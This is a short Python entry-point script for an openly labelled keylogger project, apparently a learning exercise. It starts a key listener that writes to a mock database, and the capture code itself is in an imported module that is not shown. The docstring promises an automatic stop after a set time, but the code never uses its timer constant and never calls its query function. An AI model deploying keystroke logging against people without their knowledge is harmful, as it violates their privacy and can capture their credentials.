#!/usr/bin/env python3

from time import sleep
from key_listener import KeyListener
from database import MockDatabaseDAO

SLEEP_TIME_IN_SECONDS = 30


'''
    Entry point for key logger program that creates a data base connection and starts the key listener.
    After a set amount of time, automatically stops the key listener and queries what keystrokes has been logged.
'''


def main():
    database_connection, key_listener = setup()
    while(key_listener.listening):
        continue
    exit()
    


'''
    Sets up the database and the listener, passing the database to the listener.
'''


def setup():
    print("Starting script... ")
    database_connection = MockDatabaseDAO()
    key_listener = KeyListener(database_connection)
    return database_connection, key_listener


'''
    Queries the database. Write your custom queries here.
'''


def query_database(database_connection):
    
    for keystroke in database_connection.keystrokes:
        print(keystroke.key_pressed)
    # print(database_connection.query_by_date())


if __name__ == "__main__":
    main()
